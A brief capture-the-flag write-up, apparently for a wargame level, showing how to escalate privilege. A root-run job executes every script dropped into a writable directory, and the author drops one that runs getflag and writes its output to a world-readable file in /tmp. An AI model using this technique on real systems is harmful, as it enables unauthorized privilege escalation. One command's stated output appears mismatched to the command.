#received a message saying "You've got mail"
#check the mail folder location in the env variable

/usr/bin/env # output MAIL=/var/mail/level05

ls -l /var/mail/level05 # output su -c 'sh /usr/sbin/openarenaserver' - flag05 

#this file executes all files present in /opt/openarenaserver and deletes them right away. 
#we will create a script that runs getflag and add permissions for all users to read generated file /tmp/getflag
#in /opt/openarenaserver create file script.sh

rm -rf /tmp/getflag
getflag > /tmp/getflag
chmod 755 /tmp/getflag
